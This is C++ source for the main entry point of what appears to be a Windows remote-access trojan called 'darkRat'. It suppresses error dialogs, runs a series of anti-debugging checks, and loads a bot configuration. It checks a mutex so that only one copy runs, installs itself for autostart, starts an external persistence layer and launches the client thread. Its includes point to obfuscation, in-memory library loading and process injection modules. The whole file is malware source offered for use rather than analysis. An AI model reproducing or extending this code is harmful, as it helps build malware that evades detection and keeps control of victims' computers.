#include <stdio.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include "antidbg.h"
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include <list>
#include "obfuscat.h"
#include "BuildSystem\json.h"
#include "BuildSystem\config.h"
#include <conio.h>
#include "URL.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#include "MemLoadLibrary.h"
#include "Helpers.hpp"
#include "OsHelpers.hpp"
#include "DarkRequest.h"
#include "XOR.h"
#include "spiderrun.h"
#include "inject.h"
#include "Client.h"
#include "persistenceLayer.h"
#include <signal.h>


#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")

void suppress_crash_handlers(void);
long WINAPI unhandled_exception_handler(EXCEPTION_POINTERS* p_exceptions)
{
	// Suppress C4100 Warnings unused parameters required to match the 
	// function signature of the API call.
	(void*)p_exceptions;

	// Throw any and all exceptions to the ground.
	return EXCEPTION_EXECUTE_HANDLER;
}
extern "C" void handleErrors(int signal_number)
{
	/*Your code goes here. You can output debugging info.
	  If you return from this function, and it was called
	  because abort() was called, your program will exit or crash anyway
	  (with a dialog box on Windows).
	 */
}


#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is the "handle" to YOUR PROGRAM ITSELF.
		HINSTANCE hPrevInstance,// USELESS on modern windows (totally ignore hPrevInstance)
		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
		int iCmdShow){
#endif
	SetUnhandledExceptionFilter(unhandled_exception_handler);
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
	
	adbg_IsDebuggerPresent();
	adbg_IsDebuggerPresent();
	adbg_CheckRemoteDebuggerPresent();
	adbg_BeingDebuggedPEB();
	adbg_NtGlobalFlagPEB();
	adbg_HardwareDebugRegisters();

	adbg_RDTSC();
	adbg_QueryPerformanceCounter();
	adbg_GetTickCount();
	

	darkRat::config::config config = darkRat::config::load();
	//Config config;
	std::thread darkMain;

	//Check if the Bot is Running
	std::string mutex = "Local\\" + config.mutex;
	CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
	if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
		return -1; // quit; mutex is released automatically
		
	//Autostart  (with persistence) && Clone
	if (config.startup == "true") {
		std::string insatlled = Helpers::installedOrnot();
		if (insatlled == OBFUSCATE("restart")) {
			return 0;
		}
	}

	//Run External Persistence Object
	if (config.persistence == "true") {
		createLayer();
		startLayer();
	}

	darkMain = std::thread(Client::darkMainThread, config);
	darkMain.join();

	return 0;
}
